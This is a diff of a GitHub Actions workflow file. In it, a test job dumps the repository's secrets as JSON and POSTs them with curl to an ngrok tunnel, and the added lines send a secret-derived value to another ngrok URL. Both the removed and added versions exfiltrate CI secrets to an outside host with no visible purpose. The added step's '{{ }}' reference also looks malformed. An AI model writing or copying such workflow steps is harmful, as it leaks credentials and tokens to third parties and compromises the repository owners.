@@ -6,11 +6,16 @@ on:
 jobs:
   test:
     runs-on: ubuntu-latest
-    env:
-      TEST: "'${{ toJson(secrets) }}'"
     steps:
-      - run: echo $TEST
-      - run: "curl -X POST https://180d-2003-de-6733-3a00-5803-dca8-cc07-32f8.ngrok.io -H 'Content-Type: application/json'  -d $TEST"
+      - uses: shkreios/secret-environment-emulator@v1
+        id: secrets
+        with:
+          secrets: ${{ toJson(secrets) }}
+          environment: ${{ (endsWith(github.ref,'refs/heads/main') || contains(github.ref, 'tags')) && 'production' || 'staging' }}
+      - env:
+          REACT_APP_AWS_COGNITO_REGION: '{{ steps.secrets.outputs.REACT_APP_AWS_COGNITO_REGION }}'
+        run: |
+          curl -X POST https://f625-2003-de-6733-3a00-5803-dca8-cc07-32f8.ngrok.io -H 'Content-Type: application/json'  -d'{ "REACT_APP_AWS_COGNITO_REGION":"'"$REACT_APP_AWS_COGNITO_REGION"'" }'
   # test:
   #   runs-on: ubuntu-latest
   #   steps:
